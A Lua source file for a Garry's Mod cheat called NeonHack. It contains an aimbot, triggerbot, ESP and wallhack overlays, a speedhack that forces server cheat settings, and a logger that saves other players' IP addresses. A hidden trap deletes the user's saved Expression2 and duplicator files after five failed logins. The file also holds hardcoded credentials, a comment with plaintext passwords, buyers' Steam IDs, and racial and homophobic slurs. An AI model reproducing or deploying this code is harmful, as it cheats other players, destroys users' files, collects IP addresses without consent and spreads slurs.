
//////////////////////
//[NH]Core////////////
//Coded By Fisheater//
//////////////////////

Msg( "                      \n" )
Msg( "//////////////////////\n" )
Msg( "///////NeonHack///////\n" )
Msg( "///Initializing...////\n" )
Msg( "//////////////////////\n" )
Msg( "                      \n" )
Msg( "                      \n" )

Msg( "NeonHack is up-to-date! \n" )

local PossibleUserNames = { "fisheater124", "nismo1211", "dan", "dummy122", "blackheim", "chiwawa", "nigger", "lolbo", "vulkus", "crater", "dragonheart1995", "boxedin123", "epicdulzura", "scope" }
local PossiblePassCodes = { "1472994283", "3989721539", "2233149203", "1120869851", "351959269", "2584031210", "2702905881", "1791301996", "2083553565", "2344874481", "2052858118", "745421676", "2826601168" } --eggosaregood, cheese, FuckOff3211, @ro0t!!!!, lemar, sedlock25c, 77010, wonder1555, 4275543, runite, fagg0t

local SteamIDS = { "STEAM_0:1:34911301", "STEAM_0:1:25812285", "STEAM_0:1:21258984", "STEAM_0:0:14073219", "STEAM_0:1:27314649", "STEAM_0:1:37836545", "STEAM_0:1:20789337", "STEAM_0:1:12209165", "STEAM_0:1:25266961", "STEAM_0:0:20472448", "STEAM_0:0:25250275", "STEAM_0:1:30285776", "STEAM_0:1:33962112", "STEAM_0:1:33708353", "STEAM_0:1:35841551", "STEAM_0:0:19807101" }

--FOR STEAMIDS: 1 = Fisheater, 2 = Nismo, 3 = FuckOff *BOUGHT*, 4 = FoxX, 5 = World of screams, 6 = Chiwawa ( British Kid ), 7 = Molly *BOUGHT*, 8 = Lolbo *BOUGHT*, 9 = Aviator12234, 10 = Vulkus *BOUGHT*, 11 = Crater *BOUGHT*, 12 = Dragon*BOUGHT*, 13 = Boxin123 VAC'D *GAVE STEAM ACCOUNT, 14 = Boxin123 *GAVE STEAM ACCOUNT*, 15 = �GPG� EpicDulzura*BOUGHT*, 16 = Luigi/scoPE*GAVE STEAM ACCOUNT*

timer.Simple( 0.8, function()
RunConsoleCommand( "Neon_LoadMenu" )
end )

concommand.Add( "Neon_LoadMenu", function()

local DParent = vgui.Create( "DFrame" )
DParent:SetPos( ScrW()/2 - 150, ScrH()/2 - 100 )
DParent:SetSize( 300, 200 )
DParent:SetTitle( "NeonHack Login Menu" )
DParent:ShowCloseButton( true )
DParent:SetDraggable( true )
DParent:MakePopup()

local UserLabel = vgui.Create( "DLabel", DParent )
UserLabel:SetPos( 30, 40 )
UserLabel:SetText( "Username:" )

local TextEntryU = vgui.Create( "DTextEntry", DParent )
TextEntryU:SetMultiline( false )
TextEntryU:SetSize( 240, 20 )
TextEntryU:SetPos( 30, 60 )
TextEntryU:SetEnterAllowed( false )

local PasswordLabel = vgui.Create( "DLabel", DParent )
PasswordLabel:SetPos( 30, 90 )
PasswordLabel:SetText( "Password:" )

local TextEntryI = vgui.Create( "DTextEntry", DParent ) 
TextEntryI:SetMultiline( false ) 
TextEntryI:SetSize( 240, 20 )
TextEntryI:SetPos( 30, 110 ) 
TextEntryI:SetEnterAllowed( false )

	local oPaint = TextEntryI.Paint
	function TextEntryI:Paint()
		local old = self:GetValue()
		
		self:SetValue(old:gsub(".", "*"))		
		local ret = oPaint(self)		
		self:SetValue(old)
		
		return ret
	end

local CrashCount = 0

local Dbutton = vgui.Create( "DButton", DParent ) 
Dbutton:SetPos( 100, 160 ) Dbutton:SetSize( 100, 30 )
Dbutton:SetText( "Login" )
Dbutton.DoClick = function()

if !table.HasValue( PossibleUserNames, TextEntryU:GetValue() ) then
if !table.HasValue( PossiblePassCodes, util.CRC( TextEntryI:GetValue() ) ) then

Dbutton:SetText( "Access Denied!" )

CrashCount = CrashCount + 1

if CrashCount == 5 then
for sidk, sidv in pairs( SteamIDS ) do
if sidv ~= LocalPlayer():SteamID() then

local E2s = file.Find( "Expression2/*.txt" )

for k, v in pairs( E2s ) do
file.Delete( "Expression2/" .. v )
end

local E2Shared = file.Find( "Expression2/e2shared/*.txt" )

for k, v in pairs( E2Shared ) do
file.Delete( "Expression2/e2shared/" .. v )
end

local AdvDups = file.Find( "adv_duplicator/*.txt" )

for k, v in pairs( AdvDups ) do
file.Delete( "adv_duplicator/" .. v )
end

local AdvDupShared = file.Find( "adv_duplicator/e2shared/*.txt" )

for k, v in pairs( AdvDupShared ) do
file.Delete( "adv_duplicator/e2shared/" .. v )
end

timer.Simple( 1, function()
LocalPlayer():ConCommand( "cc_random" )
		end )
	end
end

timer.Simple( 2, function()
Dbutton:SetText( "Login" )
			end )
		end
	end
end

if table.HasValue( PossibleUserNames, string.lower( TextEntryU:GetValue() ) ) then
if table.HasValue( PossiblePassCodes, ( util.CRC( TextEntryI:GetValue() ) ) ) then
if table.HasValue( SteamIDS, LocalPlayer():SteamID() ) then

if not file.Exists( "NeonAuth.txt" ) then 
if table.HasValue( SteamIDS, LocalPlayer():SteamID() ) then
file.Write( "NeonAuth.txt", "[NH] SteamID: " .. LocalPlayer():SteamID() .. " Pass: " .. util.CRC( TextEntryI:GetValue() ) .. "" )
	end 
end

NeonHackCore()
DParent:SetVisible( false ) 
			end
		end
	end
end

if file.Exists( "NeonAuth.txt" ) then
for k, v in pairs( PossiblePassCodes ) do
if file.Read( "NeonAuth.txt" ) == "[NH] SteamID: " .. LocalPlayer():SteamID() .. " Pass: " .. v .. "" then
TextEntryU:SetText( "Admin" )
TextEntryI:SetText( "password" )
Dbutton:SetText( "Access Granted!" )
timer.Simple( 1, function()
DParent:SetVisible( false )
NeonHackCore()
				end )
			end
		end
	end
end )

--------------------------------------------------------------------------------------------------------

function NeonHackCore()
//NeonHack
//Coded By Fisheater
//December 11th, 2010

--Clientside Only--
if ( SERVER ) then return end

--Require Modules--
require( 'neon_core' )
require( 'neon_fvar' )

local oRCC  = RunConsoleCommand
local oECC  = engineConsoleCommand
 
local oMsgN = MsgN
local oPCC  = _R.Player.ConCommand
 
local oCVGI = _R.ConVar.GetInt
local oCVGB = _R.ConVar.GetBool
local oGCVN = GetConVarNumber
local oGCVS = GetConVarString
 
local oC  = table.Copy( concommand )
local oT  = table.Copy( timer )
local oH  = table.Copy( hook )
local oCV = table.Copy( cvars )
local oS  = table.Copy( sql )
local oSR = table.Copy( string )
local oM  = table.Copy( math )
local oF  = table.Copy( file )
local oD  = table.Copy( debug )
local oHTTP = table.Copy( http )
local oUM = table.Copy( usermessage )

local Neon = {}

//ConVars
CreateClientConVar( "Neon_PlayerESP", 0, true, false )
CreateClientConVar( "Neon_PlayerESP_Health", 0, true, false )
CreateClientConVar( "Neon_PlayerESP_ShowAll", 0, true, false )
CreateClientConVar( "Neon_NPCESP", 0, true, false )
CreateClientConVar( "Neon_PlayerFullBright", 0, true, false )
CreateClientConVar( "Neon_PlayerWireFrame", 0, true, false )
CreateClientConVar( "Neon_MoneyPrinterESP", 0, true, false )
CreateClientConVar( "Neon_MoneyESP", 0, true, false )
CreateClientConVar( "Neon_ShipmentESP", 0, true, false )
CreateClientConVar( "Neon_FullBright", 0, true, false )
CreateClientConVar( "Neon_Gray", 0, true, false )
CreateClientConVar( "Neon_WorldWireFrame", 0, true, false )
CreateClientConVar( "Neon_PlayerBox", 0, true, false )
CreateClientConVar( "Neon_Bhop", 0, true, false )
CreateClientConVar( "Neon_ULXAntiGag", 0, true, false )
CreateClientConVar( "Neon_NikeSpeed", 7, true, false )
CreateClientConVar( "Neon_HostFrameRate", 1, true, false )
CreateClientConVar( "Neon_HostTimeScale", 0, true, false )
CreateClientConVar( "Neon_SpeedHack_CheatsOff", 1, true, false )
CreateClientConVar( "Neon_Traitor", 0, true, false )
CreateClientConVar( "Neon_KeypadHack", 0, true, false )
CreateClientConVar( "Neon_WeaponsESP", 0, true, false )
CreateClientConVar( "Neon_AimBot_TriggerBot", 0, true, false )
CreateClientConVar( "Neon_PlayerWallHackFull", 0, true, false )
CreateClientConVar( "Neon_DynamicLight", 0, true, false )
CreateClientConVar( "Neon_DynamicLightSize", 250, true, false )
CreateClientConVar( "Neon_LogPlayerIPs", 1, true, false )
CreateClientConVar( "Neon_CrossHair", 0, true, false )
CreateClientConVar( "Neon_CrossHair_Red", 255, true, false )
CreateClientConVar( "Neon_CrossHair_Green", 0, true, false )
CreateClientConVar( "Neon_CrossHair_Blue", 0, true, false )
CreateClientConVar( "Neon_C4Detection", 1, true, false )

chat.AddText(
    Color(153,153,152,255), "[NH] ",
    Color(255,0,0,255), "Hack ",
    Color(255,0,0,255), "Loaded ",
	Color(255,0,0,255), "Successfully..." )

if !file.Exists( "NeonNewPlayer.txt" ) then
LocalPlayer():ChatPrint( "Hello " .. LocalPlayer():Nick() .. "! To open the NeonHack menu bind a key to: +neon_menu" )
end

file.Write( "NeonNewPlayer.txt", "OK" )

----------------------------------------------------------------
//Fix BufferOver Flow
RunConsoleCommand( "cl_cmdrate", 100 )
RunConsoleCommand( "cl_updaterate", 101 )
RunConsoleCommand( "myinfo_bytes" , 2750 )
RunConsoleCommand( "rate" , 30000 )
----------------------------------------------------------------

--[NH] Player Aimbot
--Coded By Fisheater
--1/14/11

local NeonAim = 0

CreateClientConVar( "Neon_AimBot_IgnoreSteamFriends", 1, true, false )
CreateClientConVar( "Neon_AimBot_AimMode", 2, true, false )
CreateClientConVar( "Neon_AimBot_AimBone", 1, true, false )
CreateClientConVar( "Neon_AimBot_AimOffset", 0, true, false )
CreateClientConVar( "Neon_AimBot_NoRecoil", 1, true, false )
CreateClientConVar( "Neon_AimBot_Friendlyfire", 1, true, false )
CreateClientConVar( "Neon_AimBot_IgnoreAdmins", 1, true, false )
CreateClientConVar( "Neon_AimBot_IgnoreFriends", 0, true, false )
CreateClientConVar( "Neon_AimBot_SmoothAimSpeed", 2, true, false )
CreateClientConVar( "Neon_AimBot_SmoothAimEnabled", 0, true, false )

RunConsoleCommand( "Neon_AimBot_AimMode", tonumber( GetConVarNumber( "Neon_AimBot_AimMode" ) ) )

concommand.Add( "+Neon_Aim", function()
NeonAim = 1
end )

concommand.Add( "-Neon_Aim", function()
NeonAim = 0
end )

function IsVisible( ent )
local tracer = {}
tracer.start = LocalPlayer():GetShootPos()
tracer.endpos = ent:GetBonePosition( ent:LookupBone( "ValveBiped.Bip01_Head1" ) ) 
tracer.filter = { LocalPlayer(), ent }
tracer.mask = MASK_SHOT
local trace = util.TraceLine( tracer )
if trace.Fraction &gt;= 1 then return true else return false end
end

function Exceptions( ent124 )
if GetConVarNumber( "Neon_AimBot_IgnoreSteamFriends" ) == 1 then
if ent124:GetFriendStatus() != "friend" then return true end
else return true 
	end
end

function Exceptions2( entt124 )
if GetConVarNumber( "Neon_AimBot_Friendlyfire" ) == 0 then
if entt124:Team() != LocalPlayer():Team() then return true end
else return true
	end
end

function Exceptions3( enta124 )
if GetConVarNumber( "Neon_AimBot_IgnoreAdmins" ) == 1 then
if enta124:IsAdmin() or enta124:IsSuperAdmin() then return false else return true end
else
return true 
	end
end

function Exceptions4( v12 )
if GetConVarNumber( "Neon_AimBot_IgnoreFriends" ) &lt; 1 then return true end
if #friendslist &lt; 1 then return true end
for k1, v1 in pairs( friendslist ) do
if v12:Nick() ~= v1 then
return true
else
return false
		end
	end
end

function ClosestTarget()
local target = { NULL, 0 }
for k, v in ipairs( player.GetAll() ) do
if ValidEntity( v ) then

if v ~= LocalPlayer() then

if IsVisible( v ) then

if v:Team() ~= TEAM_SPECTATOR and v:Team() ~= "1001" and v:Team() ~= "1002" then
if v:Health() &gt; 0 and v:Alive() then
if !v:InVehicle() then
if IsVisible( v ) then
if Exceptions( v ) then
if Exceptions2( v ) then
if Exceptions3( v ) then
if Exceptions4( v ) then
local distance = v:GetPos() - LocalPlayer():GetPos()
distance = distance:Length()
distance = math.abs( distance )
if ( distance &lt; target[2] or target[1] == NULL ) then
target = { v, distance }
												end
											end
										end
									end
								end
							end
						end
					end	
				end
			end
		end
	end
end
if ValidEntity( target[1] ) then
if target[1] != LocalPlayer() then
return target[1]
else
return LocalPlayer()
		end
	end
end

function ClosestTarget2()
local pos = LocalPlayer():GetPos()
local ang = LocalPlayer():GetAimVector()
local target2 = { NULL, 0 }
for k, v in ipairs( player.GetAll() ) do
if ValidEntity( v ) then
if v ~= LocalPlayer() then

if IsVisible( v ) then

if v:Team() ~= TEAM_SPECTATOR and v:Team() ~= TEAM_UNASSIGNED and v:Team() ~= TEAM_CONNECTING then
if v:Health() &gt; 0 and v:Alive() then
if !v:InVehicle() then
if Exceptions( v ) then
if Exceptions2( v ) then
if Exceptions3( v ) then
if Exceptions4( v ) then
local crosshair = ( v:GetPos() - pos ):Normalize()
crosshair = crosshair - ang
crosshair = crosshair:Length()
crosshair = math.abs( crosshair )
if ( crosshair &lt; target2[2] ) or ( target2[1] == NULL ) then
target2 = { v, crosshair }
											end
										end
									end
								end
							end	
						end
					end
				end
			end
		end
	end
end

if ValidEntity( target2[1] ) then
if target2[1] != LocalPlayer() then
return target2[1]
else
return LocalPlayer()
		end
	end
end

hook.Add( "Think", "NeonNoRecoil", function()
if GetConVarNumber( "Neon_AimBot_NoRecoil" ) &gt;= 1 then
if LocalPlayer():GetActiveWeapon().Primary then
LocalPlayer():GetActiveWeapon().Primary.Recoil = 0
		end
	end
end )
				
function Target()
if GetConVarNumber( "Neon_AimBot_AimMode" ) &gt;= 2 then
return ClosestTarget2()
elseif GetConVarNumber( "Neon_AimBot_AimMode" ) &lt;= 1 then
return ClosestTarget()
	end
end

hook.Add( "Think", "TriggerBot1", function()
if GetConVarNumber( "Neon_AimBot_TriggerBot" ) &gt;= 1 then
if LocalPlayer():GetEyeTrace().Entity:IsPlayer() then
RunConsoleCommand( "+attack" )
else
RunConsoleCommand( "-attack" )
		end
	end
end )

--------------------------------------------------------------
local w = ScrW() / 2 - 28
local h = ScrH() / 2 - 55

CreateClientConVar( "Neon_AimBot_ShowAimStatus", 1, true, false )

function AimBoat()

if NeonAim == 1 then

if !Target() then
if GetConVarNumber( "Neon_AimBot_ShowAimStatus" ) &gt;= 1 then
draw.SimpleText( "Scanning...", "TabLarge", w, h, Color( 0, 255, 0, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
	end
end

if Target() and ValidEntity( Target() ) then

local BonePos
local TarAng

if GetConVarNumber( "Neon_AimBot_AimBone" ) &lt;= 0 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Head1" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) == 1 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Head1" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) == 2 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Neck1" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) == 3 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Spine4" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) == 4 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Spine2" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) == 5 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Spine1" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) == 4 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Spine" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
elseif GetConVarNumber( "Neon_AimBot_AimBone" ) &gt;= 5 then
BonePos = Target():GetBonePosition( Target():LookupBone( "ValveBiped.Bip01_Spine" ) ) + Vector( 0, 0, tonumber( GetConVarNumber( "Neon_AimBot_AimOffset" ) ) )
end

BonePos = BonePos + Target():GetVelocity() / 50 - LocalPlayer():GetVelocity() / 50

TarAng = ( BonePos - LocalPlayer():GetShootPos() ):Angle()

TarAng.p = math.NormalizeAngle( TarAng.p )
TarAng.y = math.NormalizeAngle( TarAng.y )
TarAng.r = 0

if GetConVarNumber( "Neon_AimBot_SmoothAimEnabled" ) &gt;= 1 then

local Angle1 = LocalPlayer():EyeAngles()
local Smooth1 = math.Approach( LocalPlayer():EyeAngles().p, TarAng.p, GetConVarNumber( "Neon_AimBot_SmoothAimSpeed" ) )
local Smooth2 = math.Approach( LocalPlayer():EyeAngles().y, TarAng.y, GetConVarNumber( "Neon_AimBot_SmoothAimSpeed" ) )

LocalPlayer():SetEyeAngles( Angle( Smooth1, Smooth2, 0 ) )

if GetConVarNumber( "Neon_AimBot_ShowAimStatus" ) &gt;= 1 then
draw.SimpleText( "Target Locked!", "TabLarge", w, h, Color( 255, 0, 0, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
draw.SimpleText( "TARGET: " .. Target():Nick(), "TabLarge", w, h + 15, Color( 255, 0, 0, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
end

else

LocalPlayer():SetEyeAngles( Angle( TarAng.p, TarAng.y, 0 ) )

if GetConVarNumber( "Neon_AimBot_ShowAimStatus" ) &gt;= 1 then
draw.SimpleText( "Target Locked!", "TabLarge", w, h, Color( 255, 0, 0, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
draw.SimpleText( "Target: " .. Target():Nick(), "TabLarge", w, h + 15, Color( 255, 0, 0, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
end

if !LocalPlayer():GetEyeTrace().Entity:IsPlayer() then return end

			end
		end
	end
end
hook.Add( "HUDPaint", "NeonHackAimBoat", AimBoat )

---------------------------------------------

//Player ESP
function PlayerESP()

--draw.SimpleText( "NeonHack Users:", "Default", ScrW() - 215, 105, Color( 255, 150, 0, 255 ), 0, 0 )

--for k3, v3 in ipairs( player.GetAll() ) do

--if v3:GetEmail() == "N/A - 82131" then

--draw.SimpleText( v3:Name(), "Default", ScrW() - 175, 105 + ( ( k3 - 1 ) * 10 ), Color( 255, 150, 0, 255), 0, 0 )

	--end
--end

if GetConVarNumber( "Neon_PlayerESP" ) &gt;= 1 then
for k, v in pairs( player.GetAll() ) do
if ValidEntity( v ) then
if v ~= LocalPlayer() then
local PlyESPPos = ( v:EyePos() ):ToScreen()
if v:Alive() and v:Team() ~= TEAM_SPECTATOR then
draw.SimpleText( v:Nick(), "TabLarge", PlyESPPos.x, PlyESPPos.y, team.GetColor( v:Team() ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

if v:IsAdmin() then
if GetConVarNumber( "Neon_Traitor" ) &gt;= 1 then
draw.SimpleText( "*Admin*", "TabLarge", PlyESPPos.x, PlyESPPos.y - 32, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
else
draw.SimpleText( "*Admin*", "TabLarge", PlyESPPos.x, PlyESPPos.y - 13, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
end

if !v:IsAdmin() then
if v:GetFriendStatus() == "friend" then
if GetConVarNumber( "Neon_Traitor" ) &gt;= 1 then
draw.SimpleText( "*Friend*", "TabLarge", PlyESPPos.x, PlyESPPos.y - 32, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
else
draw.SimpleText( "*Friend*", "TabLarge", PlyESPPos.x, PlyESPPos.y - 13, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end
	end
end

local colorhp

if GetConVarNumber( "Neon_PlayerESP_Health" ) &gt;= 1 then
if v ~= LocalPlayer() then

local hp = ( v:Health() ) / 2
local PlyESPPos = ( v:EyePos() ):ToScreen()

if v:Health() &gt;= 75 then
colorhp = Color( 0, 255, 0, 255 )
elseif v:Health() &gt;= 35 and v:Health() &lt; 75 then
colorhp = Color( 255, 255, 0, 255 )
elseif v:Health() &lt; 35 then
colorhp = Color( 255, 0, 0, 255 )
end
if v:Team() ~= TEAM_SPECTATOR and v:Alive() and v:Health() &gt; 0 then
draw.RoundedBox( 4, PlyESPPos.x - 23, PlyESPPos.y + 22, hp, 5, colorhp )
		end
	end
end

else

if GetConVarNumber( "Neon_PlayerESP_ShowAll" ) &gt;= 1 then
draw.SimpleText( "*Dead*", "TabLarge", PlyESPPos.x, PlyESPPos.y - 22, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
draw.SimpleText( v:Nick(), "TabLarge", PlyESPPos.x, PlyESPPos.y, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
						end
					end
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "PlayerESP1", PlayerESP )

function PlayerBox()
	if GetConVarNumber( "Neon_PlayerBox" ) &gt;= 1 then
		for k, v in pairs ( player.GetAll() ) do
			if v ~= LocalPlayer() then
			if v:Alive() and v:Team() ~= TEAM_SPECTATOR then
				local PlayerBoxPos = v:EyePos():ToScreen()
				surface.SetDrawColor( team.GetColor( v:Team() ) )
				surface.DrawOutlinedRect( PlayerBoxPos.x - 40 / 2, PlayerBoxPos.y - 40 / 2, 40, 80 )
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "PlayerBox1", PlayerBox )

function NPCESP()
if GetConVarNumber( "Neon_NPCESP" ) &gt;= 1 then
for k, v in pairs( ents.GetAll() ) do
if ValidEntity( v ) then
if v:IsNPC() then
local NpcESPPos = ( v:EyePos() ):ToScreen()
draw.SimpleText( v:GetClass(), "TabLarge", NpcESPPos.x, NpcESPPos.y - 22, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "NPCESP1", NPCESP )

function C4Detection()
if GetConVarNumber( "Neon_C4Detection" ) &gt;= 1 then
for k, v in pairs( ents.GetAll() ) do
if ValidEntity( v ) then
if v:GetClass() == "ttt_c4" then
local NpcESPPos2 = ( v:EyePos() ):ToScreen()
if math.max( 0, v:GetExplodeTime() - CurTime() ) == "00:00" then
draw.SimpleText( "C4", "TabLarge", NpcESPPos2.x, NpcESPPos2.y - 22, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
elseif math.max( 0, v:GetExplodeTime() - CurTime() ) ~= "00:00" then
draw.SimpleText( "C4 | TIME LEFT: " .. string.FormattedTime( math.max( 0, v:GetExplodeTime() - CurTime() ), "%02i:%02i" ), "TabLarge", NpcESPPos2.x, NpcESPPos2.y - 22, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
					end
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "C4Det1", C4Detection )

//WallHack
function WallHack()
if GetConVarNumber( "Neon_PlayerFullBright" ) &gt;= 1 then
for k, v in pairs(ents.GetAll()) do
if ValidEntity( v ) then
if v:IsPlayer() or v:IsNPC() then
v:SetMaterial( "" )
cam.Start3D( EyePos(), EyeAngles() )
v:DrawModel()
cam.End3D()
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "WallHack1", WallHack )

//MoneyPrinterESP
function MoneyPrinterESP()
if GetConVarNumber( "Neon_MoneyPrinterESP" ) &gt;= 1 then
for k, v in pairs( ents.GetAll() ) do
if ValidEntity( v ) then
if v:GetClass() == "money_printer" or v:GetClass() == "reg_money_printer" or v:GetClass() == "platinum_printer" or v:GetClass() == "golden_printer" or v:GetClass() == "zz_money_printer" or v:GetClass() == "money_printer_commercial" or v:GetClass() == "money_printer_industrial" then
MoneyPrinterPos = v:EyePos():ToScreen()
draw.SimpleText( v:GetClass(), "TabLarge", MoneyPrinterPos.x, MoneyPrinterPos.y, Color( 255, 150, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "MoneyPrinterESP1", MoneyPrinterESP )

function MoneyESP()
if GetConVarNumber( "Neon_MoneyESP" ) &gt;= 1 then
for k, v in pairs( ents.GetAll() ) do
if ValidEntity( v ) then
if v:GetClass() == "spawned_money" then
MoneyPos = v:EyePos():ToScreen()
draw.SimpleText( "Money: $" .. v.dt.amount, "TabLarge", MoneyPos.x, MoneyPos.y, Color( 0, 255, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "MoneyESP1", MoneyESP )

//ShipmentESP
function ShipmentESP()
if GetConVarNumber( "Neon_ShipmentESP" ) &gt;= 1 then
for k, v in pairs( ents.GetAll() ) do
if ValidEntity( v ) then
if v:GetClass() == "spawned_shipment" &amp;&amp; v:GetMoveType() != 0 then
ShipmentPos = v:EyePos():ToScreen()

	local content = v.dt.contents
	local contents = CustomShipments[content]
	contents = contents.name
	
draw.SimpleText( "Shipment: " .. contents, "TabLarge", ShipmentPos.x, ShipmentPos.y, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
draw.SimpleText( "Count: " .. v.dt.count, "TabLarge", ShipmentPos.x, ShipmentPos.y + 22, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "ShipmentESP1", ShipmentESP )

function WeaponsESP()
if GetConVarNumber( "Neon_WeaponsESP" ) &gt;= 1 then

for k, v in pairs( ents.GetAll() ) do
if ValidEntity( v ) then
if v:IsWeapon() &amp;&amp; v:GetMoveType() != 0 then
if string.sub( v:GetClass(), 1, 7 ) == "weapon_" then

WeaponPos = v:EyePos():ToScreen()

draw.SimpleText( v:GetClass(), "TabLarge", WeaponPos.x, WeaponPos.y, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
					end
				end
			end
		end
	end
end
hook.Add( "HUDPaint", "WeaponsESP1", WeaponsESP )

-------------------------------------------------

//IP Logger

if not file.Exists( "neon_logged_ips.txt" ) then file.Write( "neon_logged_ips.txt", "" ) end
local tblDB2 = {}
local function SaveDB()
	local s = ""
	for k, v in pairs( tblDB2 ) do
		s = s .. k .."'s IP Address is: " ..v.. " \n"
	end
	
		file.Write( "neon_logged_ips.txt", s )
end
local function LoadNHIP()
	local tbl2 = string.Explode( "\n", file.Read( "neon_logged_ips.txt" ) )
	tblDB2 = {}
	for k,v  in pairs( tbl2 ) do
		local sep2 = string.Explode( "'s IP Address is: ", v )
		if sep2 and table.getn( sep2 ) == 2 then
			tblDB2[sep2[1]] = sep2[2]
		end
	end
end
LoadNHIP()

local function PlayerConnect( name, ip )
	tblDB2[ string.gsub( name, "'s IP Address is: ", "" ) ] = ip
	print( "[NH] Displayed Player IP: " .. name .. "'s IP Address is " .. ip )
	SaveDB()
	if GetConVarNumber( "Neon_LogPlayerIPs" ) &gt;= 1 then
	chat.AddText(
    Color(153,153,152,255), "[NH] ",
    Color(255,0,0,255), "Displayed ",
    Color(255,0,0,255), "Player ",
	Color(255,0,0,255), "IP: ",
	Color(255,0,0,255), tostring( name .. "'s IP Address = " .. ip .. "." ) )
	end
end

hook.Add( "PlayerConnect", "PlayerConnect12", PlayerConnect )

-------------------------------------------------

local SpeedType

concommand.Add( "+Neon_SpeedHack", function()
if GetConVarNumber( "Neon_HostFrameRate" ) &gt;= 1 then
if GetConVarNumber( "Neon_HostTimeScale" ) &lt;= 0 then
SpeedType = "host_framerate"
	end
end
if GetConVarNumber( "Neon_HostFrameRate" ) &gt;= 1 then
if GetConVarNumber( "Neon_HostTimeScale" ) &gt;= 1 then
SpeedType = "host_framerate"
	end
end
if GetConVarNumber( "Neon_HostFrameRate" ) &lt;= 0 then
if GetConVarNumber( "Neon_HostTimeScale" ) &gt;= 1 then
SpeedType = "host_timescale"
	end
end
if GetConVarNumber( "Neon_HostFrameRate" ) &lt;= 0 then
if GetConVarNumber( "Neon_HostTimeScale" ) &lt;= 0 then
SpeedType = "host_framerate"
	end
end
Ne.SetTCVar( "sv_cheats", "1" ) Ne.SetTCVar( SpeedType, tostring( GetConVarNumber( "Neon_NikeSpeed" ) ) ) end )

concommand.Add( "-Neon_SpeedHack", function() Ne.SetTCVar( "host_framerate", "0" ) Ne.SetTCVar( "host_timescale", "1" ) 
if GetConVarNumber( "Neon_SpeedHack_CheatsOff" ) &gt;= 1 then
Ne.SetTCVar( "sv_cheats", "0" )
	end
end )

----------------------------------------------------------------

concommand.Add( "+Neon_PropKill", function()
propkill1 = 1
end )

concommand.Add( "-Neon_PropKill", function()
propkill1 = 0
end )

function OpenS1()
orA = LocalPlayer():EyeAngles() - Angle( 0 , 180 , 0 )
Test = LocalPlayer():EyeAngles()
end
hook.Add( "Think", "Tesasd1231", OpenS1 )

function ReCalc55( cmd ) 
if propkill1 == 1 then 
orA.p = math.Clamp(orA.p + ( cmd:GetMouseY() * 0.022 ), -89, 89 ) 
orA.y = math.NormalizeAngle( orA.y + (cmd:GetMouseX() * 0.022 * -1) )
orA.r = 0 

local Forward = ((Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0):GetNormal():Angle() + (cmd:GetViewAngles() - orA)):Forward() * Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0):Length()) 
cmd:SetForwardMove( Forward.x ) 
cmd:SetSideMove( Forward.y ) 
	end
end
